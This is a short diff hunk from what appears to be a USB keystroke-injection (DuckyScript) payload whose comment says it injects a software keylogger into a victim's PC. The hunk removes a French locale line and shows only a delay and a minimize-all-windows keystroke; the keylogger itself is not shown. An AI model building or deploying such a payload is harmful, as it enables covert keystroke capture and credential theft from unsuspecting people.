@@ -1,5 +1,4 @@
 REM This script allows you to inject a software keylogger in victim's PC
-LOCALE FR
 DELAY 2500
 REM Minimize all app
 GUI d
